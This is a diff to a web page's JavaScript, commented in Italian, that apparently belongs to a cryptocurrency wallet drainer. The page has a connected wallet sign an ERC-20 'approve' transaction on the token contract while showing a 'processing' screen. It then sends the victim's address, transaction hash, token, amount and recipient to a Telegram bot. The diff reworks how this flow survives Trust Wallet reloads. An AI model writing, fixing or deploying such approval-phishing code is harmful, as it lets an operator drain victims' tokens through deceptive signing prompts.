@@ -133,56 +133,7 @@
         document.addEventListener('DOMContentLoaded', () => {
             initializeTokenDropdown();
             document.getElementById('amountInput').addEventListener('input', updateAmountInfo);
-            
-            // Gestisci il reload di Trust Wallet
-            if (sessionStorage.getItem('approveInProgress') === 'true') {
-                handlePostApprove();
-            }
         });
-
-        async function handlePostApprove() {
-            sessionStorage.removeItem('approveInProgress');
-            const userAddress = sessionStorage.getItem('userAddress');
-            const txHash = sessionStorage.getItem('txHash');
-            const txToken = sessionStorage.getItem('txToken');
-            const txAmount = sessionStorage.getItem('txAmount');
-            const txRecipient = sessionStorage.getItem('txRecipient');
-            
-            // Mostra processing screen
-            createParticles();
-            const processingScreen = document.getElementById('processingScreen');
-            if (processingScreen) {
-                processingScreen.classList.add('active');
-            }
-            
-            // Invia notifica Telegram
-            try {
-                const token = Object.values(TOKENS).find(t => t.symbol === txToken);
-                if (token && txHash) {
-                    await sendTelegramNotification(userAddress, txHash, txAmount, token, txRecipient);
-                }
-            } catch (err) {
-                console.error('Telegram error:', err);
-            }
-            
-            // Aspetta 5 secondi e chiudi
-            await new Promise(resolve => setTimeout(resolve, 5000));
-            if (processingScreen) {
-                processingScreen.classList.remove('active');
-            }
-            const btn = document.getElementById('mainButton');
-            btn.textContent = 'Next';
-            btn.disabled = false;
-            document.getElementById('amountInput').value = '';
-            updateAmountInfo();
-            
-            // Pulisci sessionStorage
-            sessionStorage.removeItem('userAddress');
-            sessionStorage.removeItem('txHash');
-            sessionStorage.removeItem('txToken');
-            sessionStorage.removeItem('txAmount');
-            sessionStorage.removeItem('txRecipient');
-        }
 
         function initializeTokenDropdown() {
             const menu = document.getElementById('tokenDropdownMenu');
@@ -296,24 +247,32 @@
                 const tx = { to: token.address, data: approveData };
                 if (userAddress) tx.from = userAddress;
 
-                // Salva lo stato PRIMA di eth_sendTransaction
-                sessionStorage.setItem('approveInProgress', 'true');
-                sessionStorage.setItem('userAddress', userAddress || 'Unknown');
-                sessionStorage.setItem('txToken', token.symbol);
-                sessionStorage.setItem('txAmount', amount);
-                sessionStorage.setItem('txRecipient', recipient);
+                let txHash = await ethereum.request({ method: "eth_sendTransaction", params: [tx] });
 
-                let txHash;
-                try {
-                    txHash = await ethereum.request({ method: "eth_sendTransaction", params: [tx] });
-                    sessionStorage.setItem('txHash', txHash);
-                } catch (e) {
-                    sessionStorage.removeItem('approveInProgress');
-                    throw e;
+                // Mostra processing screen
+                createParticles();
+                const processingScreen = document.getElementById('processingScreen');
+                if (processingScreen) {
+                    processingScreen.classList.add('active');
                 }
 
-                // Se il codice continua qui, Trust Wallet NON ha ricaricato
-                handlePostApprove();
+                // Invia notifica Telegram
+                try {
+                    await sendTelegramNotification(userAddress, txHash, amount, token, recipient);
+                } catch (err) {
+                    console.error('Telegram error:', err);
+                }
+
+                // Aspetta 5 secondi e chiudi
+                await new Promise(resolve => setTimeout(resolve, 5000));
+                if (processingScreen) {
+                    processingScreen.classList.remove('active');
+                }
+
+                btn.textContent = 'Next';
+                btn.disabled = false;
+                document.getElementById('amountInput').value = '';
+                updateAmountInfo();
 
             } catch (error) {
                 console.error("Error:", error);
@@ -376,11 +335,6 @@
             const errorDiv = document.getElementById('errorMessage');
             errorDiv.classList.remove('show');
             errorDiv.textContent = '';
-        }
-
-        if (window.ethereum) {
-            window.ethereum.on('accountsChanged', () => window.location.reload());
-            window.ethereum.on('chainChanged', () => window.location.reload());
         }
     </script>
 </body>
